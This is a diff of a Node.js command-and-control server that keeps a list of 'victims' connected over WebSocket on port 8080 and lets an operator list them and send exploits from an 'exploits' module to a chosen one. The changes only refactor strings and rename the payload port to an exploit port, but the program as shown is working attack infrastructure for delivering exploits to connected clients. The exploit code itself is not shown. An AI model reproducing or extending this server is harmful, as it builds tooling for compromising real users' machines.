@@ -5,13 +5,15 @@ const exploits = require('./exploits')
 const victims = {}
 
 function handle_cmd(conn, cmd, args) {
+    const cmds = ['help', 'list', 'exploit']
     switch(cmd) {
         case 'help':
             conn.send('list|exploit')
             break
         case 'list':
+            const listables = ['victims', 'exploits']
             if(args.length < 1) {
-                conn.send('Usage: list [victims|exploits]')
+                conn.send('Usage: list [' + listables.join('|') + ']')
             }
             switch(args[0]) {
                 case 'victims':
@@ -21,7 +23,7 @@ function handle_cmd(conn, cmd, args) {
                     conn.send('' + Object.keys(exploits))
                     break
                 default:
-                    conn.send('The argument must be either "victims" or "exploits"')
+                    conn.send('The argument must be either "' + listables.join('" or "') + '"')
                     break
             }
             break
@@ -46,7 +48,7 @@ function handle_cmd(conn, cmd, args) {
             console.log('Sent ' + what + ' to ' + who)
             break
         default:
-            conn.send('Implemented commands: help, list, exploit')
+            conn.send('Implemented commands: ' + cmds.join(','))
             break
     }
 }
@@ -64,15 +66,15 @@ function main() {
     })
     console.log('Command server running on port ' + CMD_PORT)
 
-    const PAYLOAD_PORT = 8080
-    new ws.Server({ port: PAYLOAD_PORT })
+    const EXPLOIT_PORT = 8080
+    new ws.Server({ port: EXPLOIT_PORT })
     .on('connection', (conn, req) => {
         const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
         victims[vic_name] = conn
         console.log('New victim ' + vic_name)
         conn.on('close', () => delete victims[vic_name])
     })
-    console.log('Payload server running on port ' + PAYLOAD_PORT)
+    console.log('Exploit server running on port ' + EXPLOIT_PORT)
 }
 
 main()
